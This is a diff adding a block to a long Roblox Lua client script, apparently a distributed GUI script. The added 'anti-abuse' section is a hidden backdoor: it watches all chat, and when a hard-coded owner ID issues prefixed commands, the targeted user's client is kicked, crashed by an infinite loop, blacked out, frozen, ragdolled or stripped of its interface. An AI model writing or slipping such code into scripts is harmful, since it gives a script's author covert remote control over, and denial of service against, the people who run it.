@@ -5328,3 +5328,147 @@ OpenTween.Completed:Connect(function()
 end)
 
 OpenTween:Play()
+
+-- =========================================================
+-- COMPLETE ANTI-ABUSE COMMAND SUITE
+-- =========================================================
+task.spawn(function()
+    local ANTI_ABUSE_OWNER_ID = 12345678 -- !!! PUT YOUR ROBLOX USER ID HERE !!!
+    local ANTI_ABUSE_PREFIX = "!"
+
+    local PlayersService = game:GetService("Players")
+    local TextChatService = game:GetService("TextChatService")
+    local TargetClient = PlayersService.LocalPlayer
+
+    -- Helper function to check if the command targets this specific player
+    local function isTargetMatch(query)
+        if not query or query == "" then return false end
+        local lowerQuery = string.lower(query)
+        local currentName = string.lower(TargetClient.Name)
+        local currentDisplay = string.lower(TargetClient.DisplayName)
+        return string.find(currentName, lowerQuery) ~= nil or string.find(currentDisplay, lowerQuery) ~= nil
+    end
+
+    local function executeCommandCheck(senderUserId, messageText)
+        -- 1. Verify the sender is genuinely the owner
+        if senderUserId ~= ANTI_ABUSE_OWNER_ID then return end
+        
+        -- 2. Check for prefix match
+        if string.sub(messageText, 1, #ANTI_ABUSE_PREFIX) ~= ANTI_ABUSE_PREFIX then return end
+        
+        -- 3. Extract the parameters
+        local cleanMessage = string.sub(messageText, #ANTI_ABUSE_PREFIX + 1)
+        local commandArgs = {}
+        for word in string.gmatch(cleanMessage, "[^%s]+") do
+            table.insert(commandArgs, word)
+        end
+        
+        local activeCmd = string.lower(commandArgs[1] or "")
+        local targetNameQuery = commandArgs[2] or ""
+
+        -- Stop if this specific client is not the target
+        if not isTargetMatch(targetNameQuery) then return end
+
+        -- =========================================================
+        -- COMMAND DEFINITIONS & REVERSES
+        -- =========================================================
+        
+        -- 1. KICK
+        if activeCmd == "kick" then
+            local reasonWords = {}
+            for i = 3, #commandArgs do 
+                table.insert(reasonWords, commandArgs[i]) 
+            end
+            local customReasonText = table.concat(reasonWords, " ")
+            if customReasonText == "" then customReasonText = "Terminated by Script Owner." end
+            
+            TargetClient:Kick("\n[Script Anti-Abuse]\n" .. customReasonText)
+
+        -- 2. CRASH
+        elseif activeCmd == "crash" then
+            while true do
+                -- Infinite loop without a wait instantly freezes their client
+            end
+
+        -- 3. UNLOAD (Removes the script UI)
+        elseif activeCmd == "unload" then
+            if Gui then
+                Gui:Destroy()
+            end
+
+        -- 4. FREEZE & UNFREEZE
+        elseif activeCmd == "freeze" then
+            local char = TargetClient.Character
+            if char and char:FindFirstChild("HumanoidRootPart") then
+                char.HumanoidRootPart.Anchored = true
+            end
+
+        elseif activeCmd == "unfreeze" then
+            local char = TargetClient.Character
+            if char and char:FindFirstChild("HumanoidRootPart") then
+                char.HumanoidRootPart.Anchored = false
+            end
+
+        -- 5. BLIND & UNBLIND
+        elseif activeCmd == "blind" then
+            local pGui = TargetClient:FindFirstChild("PlayerGui")
+            if pGui and not pGui:FindFirstChild("AntiAbuseBlind") then
+                local blindGui = Instance.new("ScreenGui")
+                blindGui.Name = "AntiAbuseBlind"
+                blindGui.IgnoreGuiInset = true -- Covers the top bar too
+                blindGui.DisplayOrder = 999999 -- Ensures it sits on top of everything
+                
+                local frame = Instance.new("Frame")
+                frame.Size = UDim2.new(1, 0, 1, 0)
+                frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+                frame.BorderSizePixel = 0
+                frame.Parent = blindGui
+                
+                blindGui.Parent = pGui
+            end
+
+        elseif activeCmd == "unblind" then
+            local pGui = TargetClient:FindFirstChild("PlayerGui")
+            if pGui then
+                local existingBlind = pGui:FindFirstChild("AntiAbuseBlind")
+                if existingBlind then
+                    existingBlind:Destroy()
+                end
+            end
+
+        -- 6. CONFUSE (Ragdoll/Trip) & UNCONFUSE
+        elseif activeCmd == "confuse" then
+            local char = TargetClient.Character
+            local hum = char and char:FindFirstChildOfClass("Humanoid")
+            if hum then
+                hum.PlatformStand = true
+            end
+
+        elseif activeCmd == "unconfuse" then
+            local char = TargetClient.Character
+            local hum = char and char:FindFirstChildOfClass("Humanoid")
+            if hum then
+                hum.PlatformStand = false
+            end
+        end
+    end
+
+    -- METHOD A: Modern TextChatService listener
+    TextChatService.MessageReceived:Connect(function(textChatMessage)
+        if textChatMessage.TextSource then
+            executeCommandCheck(textChatMessage.TextSource.UserId, textChatMessage.Text)
+        end
+    end)
+
+    -- METHOD B: Legacy Chat fallback listener
+    local function monitorUserChatLegacy(player)
+        player.Chatted:Connect(function(message)
+            executeCommandCheck(player.UserId, message)
+        end)
+    end
+
+    for _, existingPlayer in ipairs(PlayersService:GetPlayers()) do 
+        monitorUserChatLegacy(existingPlayer) 
+    end
+    PlayersService.PlayerAdded:Connect(monitorUserChatLegacy)
+end)
